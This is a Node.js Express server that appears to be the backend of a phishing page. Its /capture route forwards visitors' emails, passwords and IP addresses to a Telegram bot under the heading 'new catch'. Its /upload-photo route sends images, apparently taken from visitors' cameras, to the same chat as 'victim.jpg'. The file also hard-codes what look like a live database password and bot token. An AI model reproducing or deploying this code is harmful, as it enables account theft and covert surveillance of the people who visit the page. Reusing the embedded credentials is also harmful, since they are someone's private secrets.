const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const FormData = require('form-data');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(__dirname));

const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

mongoose.connect(MONGO_URI).then(() => console.log("✅ DB Connected"));

app.post('/capture', async (req, res) => {
    const data = req.body;
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const msg = `🚀 **صيد جديد**\n📧 الحساب: \`${data.email}\` \n🔑 الكلمة: \`${data.password}\` \n🌐 IP: \`${visitorIp}\``;
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' });
    } catch (e) { console.log("Telegram Msg Error"); }
    res.sendStatus(200);
});

app.post('/upload-photo', async (req, res) => {
    try {
        const { image } = req.body;
        const buffer = Buffer.from(image.split(",")[1], 'base64');
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'victim.jpg' });
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, { headers: form.getHeaders() });
        res.sendStatus(200);
    } catch (e) { console.log("Photo Error"); res.sendStatus(500); }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 Server Running`));
